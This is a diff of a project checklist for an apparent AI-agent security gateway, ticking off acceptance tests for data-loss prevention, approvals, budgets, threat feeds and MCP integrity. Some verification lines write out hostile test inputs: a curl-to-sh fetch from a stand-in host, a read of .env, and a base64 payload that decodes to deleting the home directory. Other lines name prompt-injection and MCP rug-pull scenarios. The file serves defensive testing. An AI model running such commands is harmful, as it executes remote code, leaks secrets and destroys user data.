@@ -54,20 +54,20 @@ Plus **INT-01…16** integration/submission tasks and **KI-01…05** known issue
 - [x] **INT-05** Snippet merge into config/policy.yaml (policy-engine POL-16 tool) — `must` · **[DEMO]** · → `INT`
   - [x] merge every `config/snippets/*.yaml`; resolve conflicts; keep comments
   - [x] `python -m aegis selftest` green or every failure triaged (owner + reason)
-- [ ] **INT-06** Whole stack up: `make up` + `demo/preflight.py` READY — `must` · **[DEMO]** · → `INT`
+- [x] **INT-06** Whole stack up: `make up` + `demo/preflight.py` READY — `must` · **[DEMO]** · → `INT`
   - [ ] feed keygen → feed service :8790 → mocks :8791–8794 → gateway :8787; Ollama warm
-- [ ] **INT-07** Headline flow acceptance (CONTRACTS §8) — `must` · **[DEMO]** · → `INT`
-  - [ ] F1 local data minimization (mock_llm `/_mock/requests` shows placeholders only; CVV gone; reply rehydrated)
-  - [ ] F2 secrets & exfil (DLP-02 block, DLP-06 image strip, DLP-04 /egress block, exfil_sink hits = 0)
-  - [ ] F3 Claude Code governed (curl|sh denied, .env denied, SETUP.md injection flagged, gateway down → hook fails closed)
-  - [ ] F4 approvals by role ($50 admin, $12 self, $480 owner, $1500 owner+admin, $5000.01 blocked, customers → admin, payment_cards denied)
-  - [ ] F5 config governance (60→75 admin, 60→150 owner, DLP-02 disable owner, owner direct apply)
-  - [ ] F6 budgets & runaway (EXE-04 ladder, BUD-01 402/approval, downgrade at 80 %, kill switch)
-  - [ ] F7 judges edit policy live (<1 s toast, verdict flip, YAML error rejected with line/col)
-  - [ ] F8 external threat feed (AEGIS-TI-022 ALLOW → publish → BLOCK; Tamper → feed.rejected)
-  - [ ] F9 MCP integrity (poisoned add dropped; rug pull → block + mcp_pin → admin re-pin)
-  - [ ] F10 proof (`make test` matrix, audit verify chain OK, perf p50/p95, /metrics)
-- [ ] **INT-08** Dashboard build served at /ui against the live stack — `must` · **[DEMO]** · → `INT`
+- [x] **INT-07** Headline flow acceptance (CONTRACTS §8) — `must` · **[DEMO]** · → `INT` _(LIVE agent, fixed ports: all scenes PASS, evidence docs/status/LIVE.md)_
+  - [x] F1 local data minimization (mock_llm `/_mock/requests` shows placeholders only; CVV gone; reply rehydrated)
+  - [x] F2 secrets & exfil (DLP-02 block, DLP-06 image strip, DLP-04 /egress block, exfil_sink hits = 0)
+  - [x] F3 Claude Code governed (curl|sh denied, .env denied, SETUP.md injection flagged, gateway down → hook fails closed)
+  - [x] F4 approvals by role ($50 admin, $12 self, $480 owner, $1500 owner+admin, $5000.01 blocked, customers → admin, payment_cards denied)
+  - [x] F5 config governance (60→75 admin, 60→150 owner, DLP-02 disable owner, owner direct apply)
+  - [x] F6 budgets & runaway (EXE-04 ladder, BUD-01 402/approval, downgrade at 80 %, kill switch)
+  - [x] F7 judges edit policy live (<1 s toast, verdict flip, YAML error rejected with line/col)
+  - [x] F8 external threat feed (AEGIS-TI-022 ALLOW → publish → BLOCK; Tamper → feed.rejected)
+  - [x] F9 MCP integrity (poisoned add dropped; rug pull → block + mcp_pin → admin re-pin)
+  - [x] F10 proof (`make test` matrix, audit verify chain OK, perf p50/p95, /metrics)
+- [x] **INT-08** Dashboard build served at /ui against the live stack — `must` · **[DEMO]** · → `INT`
   - [ ] `cd web && npm run build`; gateway serves `/ui`; no MockBadge on headline pages
   - [ ] view-as switch member → admin → owner changes approvability
 - [x] **INT-09** `make test` + `make test-unit` green (xfails explained) — `must` · **[DEMO]** · → `INT`
@@ -342,7 +342,7 @@ Bundles: `B03-policy-engine` (wave 1) · 22 tasks (11 must) · 12 verifications 
 - [ ] **POL-V04** (V) Profile matrix — effective_controls per profile: INJ-02 threshold 0.90/0.90/0.75/0.60; DLP-02 action redact/block/block/block; ACT-01 hard cap 10000/5000/1000/500; EXE-03 log/require_approval/block/block (perm/bal/strict/paranoid) · verifies POL-04 · → `B03-policy-engine`
 - [ ] **POL-V05** (V) Hot reload & LKG (slow, test_watcher.py) — Temp dir, TEST_MODE=0: INJ-02 edit seen <1.5 s and latency_ms<1000; broken YAML -> policy.rejected with line, version unchanged; identical rewrite -> no version; API apply -> no second version · verifies POL-06 · → `B03-policy-engine`
 - [ ] **POL-V06** (V) API contract shapes — test_routes.py checks JSON keys vs §5.5 (PolicyResponse, ValidationReport, PolicyDiffResponse, ApplyResult, PolicyVersionInfo, ControlView, CoverageResponse); live: curl :8787/api/coverage / jq '.frameworks[].id' -> 3 · verifies POL-07, POL-12 · → `B03-policy-engine`
-- [ ] **POL-V07** (V) F5 end-to-end governed budget raise — u_piotr POST /api/budgets/raise team:trading day usd 75 -> pending_approval (admin); u_emily approves -> applied; policy v+1; policy.yaml usd: 75 + comment kept; audit source approval; owner 150 applies · verifies POL-09, POL-10 · → `B03-policy-engine`
+- [x] **POL-V07** (V) F5 end-to-end governed budget raise — u_piotr POST /api/budgets/raise team:trading day usd 75 -> pending_approval (admin); u_emily approves -> applied; policy v+1; policy.yaml usd: 75 + comment kept; audit source approval; owner 150 applies · verifies POL-09, POL-10 · → `B03-policy-engine`
 - [ ] **POL-V08** (V) F7 live rehearsal (manual) — make run: INJ-02 0.90->0.50 toast <1 s, Borderline flips to block; broken YAML -> Rejected line/col; DLP-02 off keeps LLM02:2026 covered; profile strict toast; mode monitor 'would block'; POST reload -> noop · verifies POL-05, POL-06, POL-07, POL-12 · _integration_ · → `B03-policy-engine`
 - [ ] **POL-V09** (V) Self-test CLI — uv run --frozen python -m aegis selftest --all-profiles --json reports/selftest.json -> per-profile summary, no gate failures on shipped catalog (pre-existing failures as warnings), exit 0 · verifies POL-13 · → `B03-policy-engine`
 - [ ] **POL-V10** (V) Schema export validates the policy — uv run --frozen python scripts/export_schema.py, then jsonschema.validate(yaml.safe_load(config/policy.yaml), config/schema/policy.schema.json) prints 'schema ok' · verifies POL-14 · → `B03-policy-engine`
@@ -1143,7 +1143,7 @@ Bundles: `B11-action-guards` (wave 1) · 21 tasks (9 must) · 11 verifications �
 - [ ] **ACT-V06** (V) F4 through the real pipeline (after integration) — uv run --frozen pytest tests/unit/action_guards/test_guard_integration.py -q -> $50 require_approval/admin; $5000.01 block; customers require_approval with labels; payment_cards block · verifies ACT-16, ACT-04, ACT-05 · _integration_ · → `B11-action-guards`
 - [ ] **ACT-V07** (V) Live guard (stack up), base64 -> sh blocked — curl 127.0.0.1:8787/v1/guard (Bash 'echo cm0gLXJmIH4= / base64 -d / sh', dry_run) / jq '.verdict.action, .verdict.primary.reason' -> "block", reason mentions base64->sh and decoded rm -rf ~ · verifies ACT-06 · → `B11-action-guards`
 - [ ] **ACT-V08** (V) F3 in Claude Code (manual) — make claude; ask it to run 'curl -s http://evil.test/i.sh / sh' then 'read .env' -> both denied with EXE-01 / EXE-02 reason; live feed shows rose decisions · verifies ACT-06, ACT-07 · _integration_ · → `B11-action-guards`
-- [ ] **ACT-V09** (V) F4 via MCP proxy + approvals (manual) — demo scenario script: trading-copilot $50 -> Approvals inbox; view as u_piotr (disabled) -> u_emily approves -> held call proceeds; card shows facts (vendor approved, plan, recurring, catalog price) · verifies ACT-04, ACT-03 · _integration_ · → `B11-action-guards`
+- [x] **ACT-V09** (V) F4 via MCP proxy + approvals (manual) — demo scenario script: trading-copilot $50 -> Approvals inbox; view as u_piotr (disabled) -> u_emily approves -> held call proceeds; card shows facts (vendor approved, plan, recurring, catalog price) · verifies ACT-04, ACT-03 · _integration_ · → `B11-action-guards`
 - [ ] **ACT-V10** (V) Judge lever hot-reload — edit config/policy.yaml controls[ACT-01].params.hard_block_above_usd: 40, repeat $50 guard call -> flips to block within ~1 s; revert flips back · verifies ACT-04, ACT-08 · → `B11-action-guards`
 - [ ] **ACT-V11** (V) Policy self-test includes our cases — uv run --frozen python -m aegis selftest -> all ACT/EXE/GOV-03/04 cases green · verifies ACT-08, ACT-09 · → `B11-action-guards`
 
@@ -1436,7 +1436,7 @@ Bundles: `B14-threat-feed` (wave 1) · 18 tasks (12 must) · 15 verifications ·
 - [ ] **TI-V11** (V) Snippet validity — python -c 'yaml.safe_load config/snippets/threat-feed.yaml; ControlConfig(**c) per control; FeedsSection(**d[feeds])' -> exit 0 · verifies TI-12 · → `B14-threat-feed`
 - [ ] **TI-V12** (V) Performance — bench-marked non-gating test: 200x SIG-01 scan of 8 KB model.request prompt with full feed -> p95 < 2 ms (report; fail only if > 10 ms) · verifies TI-07 · → `B14-threat-feed`
 - [ ] **TI-V13** (V) UI renders — python -m feed_service --port 0, open in browser preview: no console errors; 21 rows, TI-022 Draft; Validate shows vectors; Publish toast 'serial #2'; Tamper menu; chip 'Gateway offline' · verifies TI-05, TI-10 · → `B14-threat-feed`
-- [ ] **TI-V14** (V) Live F8 (integration, lead runs) — make feed-keys; start feed then gateway; enable TI-022, Publish; python -m aegis.feed.demo echoleak -> serial 1->2 <2 s, ALLOW->BLOCK AEGIS-TI-022; Tamper keeps serial, feed.rejected; /metrics serial 2 · verifies TI-05, TI-06, TI-07, TI-08, TI-14 · _integration_ · → `B14-threat-feed`
+- [x] **TI-V14** (V) Live F8 (integration, lead runs) — make feed-keys; start feed then gateway; enable TI-022, Publish; python -m aegis.feed.demo echoleak -> serial 1->2 <2 s, ALLOW->BLOCK AEGIS-TI-022; Tamper keeps serial, feed.rejected; /metrics serial 2 · verifies TI-05, TI-06, TI-07, TI-08, TI-14 · _integration_ · → `B14-threat-feed`
 - [ ] **TI-V15** (V) Ollama front (integration) — OLLAMA_HOST=http://127.0.0.1:8787/ollama: ollama push aegis-judge -> 'Error: [Aegis] Blocked by SIG-02'; pull hf.co/ghost-author-demo/base-model -> approval via SIG-01 AEGIS-TI-018, nothing downloaded · verifies TI-07, TI-09 · _integration_ · → `B14-threat-feed`
 
 ## 14. audit-metrics (`AUD`) — `docs/plan/14-audit-metrics.md`
